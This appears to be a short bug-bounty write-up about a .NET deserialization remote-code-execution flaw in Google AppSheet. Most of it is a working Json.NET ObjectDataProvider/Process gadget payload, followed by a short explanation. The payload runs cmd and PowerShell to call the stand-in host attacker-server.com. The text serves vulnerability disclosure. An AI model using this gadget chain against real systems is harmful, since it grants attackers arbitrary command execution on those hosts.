# :globe_with_meridians: 💣 $10,000 Google Bug Bounty: How a Deserialization RCE in AppSheet Could Have Led to Remote Code Execution on Google’s Infrastructure

---

## 💻 Malicious Payload Example

```
{
"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
"MethodName": "Start",
"MethodParameters": {
"$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"$values": [
"cmd",
"/c powershell -command \"Invoke-WebRequest -URI http://attacker-server.com\""
]
},
"ObjectInstance": {
"$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
}
}
```

📌 What it does:

- `ObjectDataProvider` dynamically calls `Start`

- `Process` spawns a new system process

- PowerShell sends a web request to the attacker’s server (proof of code execution)

*Attack Chain Illustratio*

---
